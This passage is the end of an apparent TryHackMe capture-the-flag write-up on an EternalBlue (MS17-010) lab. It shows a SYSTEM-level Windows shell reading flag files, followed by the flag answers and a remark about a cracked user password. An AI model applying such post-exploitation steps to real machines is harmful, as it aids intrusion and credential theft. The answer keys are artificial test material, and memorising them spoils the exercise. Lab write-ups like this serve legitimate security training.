+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">6</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          3,769 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  22,707,953,664 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>type C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt
+</span></span><span style="display:flex;"><span>type C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>sam_database_elevated_access<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt
+</span></span><span style="display:flex;"><span>type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span></span></span></code></pre></div></div>
+</div>
+
+<p><strong>Flag2? *Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</strong></p>
+<ul>
+<li>sam_database_elevated_access</li>
+</ul>
+<p><strong>flag3?</strong></p>
+<ul>
+<li>admin_documents_can_be_valuable</li>
+</ul>
+<p>And that&rsquo;s it, we have NT AUTHORITY\SYSTEM priviledges, we have all the flags, cracked Jon password. We&rsquo;re done here!
+I hope you enjoyed it,
+bye;)</p>
+
+    </div><footer class="mt-6 pt-5 border-t not-prose">
+        <div class="flex flex-wrap gap-2"><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              ctf
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              eternalblue
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              hashcat
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              metasploit
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              MS17-010
+            </span><span class="inline-block px-3 py-1 rounded-full text-sm" style="background-color: var(--color-bg-tertiary); color: var(--color-text-secondary);">
+              tryhackme
+            </span></div>
+      </footer></article>
+
+  <div class="p-4">
+    
+  </div>
+</div>
+    </div><div class="hidden xl:block">
+<aside id="sidebar-right" class="sticky top-16 hidden xl:block h-[calc(100vh-4rem)] overflow-y-auto pr-2" data-component="navigation-sidebar-right" role="complementary" aria-label="On-page navigation">
+  
+  
+</aside>
+</div></main>
+  <footer>
+
+
+
+</footer>
+  
+  
+
+</body>
+</html>
